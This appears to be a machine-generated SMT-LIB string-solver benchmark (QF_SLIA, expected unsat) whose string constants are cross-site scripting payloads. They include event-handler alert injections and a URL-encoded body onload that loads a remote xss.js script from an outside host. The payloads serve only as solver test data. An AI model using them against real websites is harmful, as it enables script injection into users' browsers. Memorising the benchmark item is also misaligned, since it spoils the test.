; random_mix, Unicode mode: x, z from disjunctions of constants, y = x ++ z, clauses of 1 to 3 random (negated) constraints of x, y, z: memberships, affixes, contains, lengths, str.at, str.indexof, str.substr, str.replace
(set-logic QF_SLIA)
(set-info :status unsat)
(declare-const x String)
(declare-const y String)
(declare-const z String)
(assert (or (= x "%22/%3E%3CBODY%20onload=\u{2019}document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)\u{2019}%3E") (= x "<a ondblclick=""alert(1)"">test</a>") (= x "<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>")))
(assert (or (= z "<bdi id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdi>") (= z "element>")))
(assert (= y (str.++ x z)))
(assert (not (str.in_re z ((_ re.from_regex ecma2020 u) "^[a-zA-Z\u{e0}\u{e8}\u{ec}\u{f2}\u{f9}\u{e9}\u{c0}\u{c8}\u{cc}\u{d2}\u{d9}\u{c9}'\s]+$"))))
(assert (not (str.contains y "ert")))
(assert (or (not (= "rc=http:/" (str.substr x 65 9))) (not (str.in_re z ((_ re.from_regex ecma2020 u) "(\+[0-9]{3}?[0-9]?[0-9]{4}?[0-9]{4}|[0-9]{3}?[0-9]{3}?[0-9]{3,4}|[0-9]{9,10})")))))
(assert (or (= (str.indexof y "2" 0) 1) (not (= (str.at x 29) "/"))))
(assert (or (str.contains x "yup=") (str.prefixof "<a " x) (str.suffixof ">" x)))
(assert (not (str.prefixof "%22/%" x)))
(check-sat)
